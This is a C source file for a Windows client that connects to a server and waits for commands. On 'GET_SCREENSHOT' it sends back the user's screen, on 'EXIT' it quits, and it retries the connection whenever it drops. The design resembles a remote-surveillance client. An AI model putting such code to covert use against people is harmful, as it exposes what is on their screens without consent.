#include "config.h"
#include "commands.h"
#include "common.h"
#include "connection.h"
#include "screenshot.h"
#include <stdio.h>

void HandleServerCommands()
{
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while (!bShouldExit && bConnected)
    {
        bytesReceived = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';

            if (strcmp(buffer, "GET_SCREENSHOT") == 0)
            {
                SendScreenshot();
            }
            else if (strcmp(buffer, "EXIT") == 0)
            {
                bShouldExit = TRUE;
                PostQuitMessage(0);
            }
        }
        else if (bytesReceived == 0)
        {
            bConnected = FALSE;
            printf("Connection closed by server. Attempting to reconnect...\n");
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
        }
        else
        {
            int error = WSAGetLastError();
            if (error != WSAEWOULDBLOCK)
            {
                bConnected = FALSE;
                printf("Connection error (%d). Attempting to reconnect...\n", error);
                closesocket(client_socket);
                client_socket = INVALID_SOCKET;
            }
        }
        Sleep(100);
    }
}

DWORD WINAPI CommandHandlerThread(LPVOID lpParam)
{
    while (!bShouldExit)
    {
        if (bConnected)
        {
            HandleServerCommands();
        }
        else
        {
            Sleep(RECONNECT_INTERVAL);
        }
    }
    return 0;
}